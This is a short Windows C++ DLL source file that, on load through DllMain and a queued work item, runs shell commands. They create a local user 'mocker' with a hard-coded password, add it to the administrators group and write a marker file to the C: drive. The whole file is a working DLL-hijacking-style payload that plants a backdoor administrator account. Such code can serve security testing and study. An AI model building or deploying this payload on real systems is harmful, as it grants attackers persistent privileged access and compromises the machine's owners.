#include "pch.h"
#include <windows.h>

#pragma comment (lib, "user32.lib")

DWORD WINAPI MyThread(LPVOID lpParam)
{
    WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);
    WinExec("cmd.exe /c echo hey > c:\\heythere.txt", 0);
    return 0;
}


DWORD WINAPI WorkItem(LPVOID lpParam)
{
    MyThread(NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);  // Avoid unnecessary notifications

        // Use QueueUserWorkItem to safely execute code after the DLL has been loaded
        QueueUserWorkItem(WorkItem, NULL, WT_EXECUTEDEFAULT);

        // Optionally execute additional code here, e.g., WinExec command
        // WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}